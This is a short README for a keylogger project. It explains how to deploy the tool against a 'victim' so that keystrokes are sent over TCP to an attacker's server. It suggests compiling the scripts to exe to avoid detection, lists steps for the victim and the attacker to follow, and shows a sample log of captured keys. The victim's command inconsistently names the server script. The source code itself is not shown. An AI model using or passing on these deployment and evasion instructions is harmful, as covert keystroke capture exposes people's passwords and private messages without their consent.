# Chrome_keylogger
A keylogger that shares keystrokes over a local TCP connection.

# How to attack:
First of all, you can edit the code a bit and compile all the scripts into exe for less detection.

Follow these steps:
  1- The victim must run the client's script, when the file is ran, the keylogger and the TCP Client will start too. 
  2- The attacker must run the server's script then bind the server's IP and port. 
  3- The attacker will start receiving keystrokes from the victim's computer.

# Deeper demonstration:
Attacker:
    
    attacker@kali:~$ python3 server.py
    
    IP: 192.168.x.x
    Port: 8080
    Client (client_ip) connected.
    
    2020-10-12 22:05:35,120: 'h'
    2020-10-12 22:05:35,390: 'i'
    2020-10-12 22:05:36,258: Key.space
    2020-10-12 22:05:36,631: 't'
    2020-10-12 22:05:36,806: 'h'
    2020-10-12 22:05:36,963: 'e'
    2020-10-12 22:05:37,080: 'r'
    2020-10-12 22:05:37,168: 'e'
    
Victim:

    victim@kali:~$ python3 server.py    
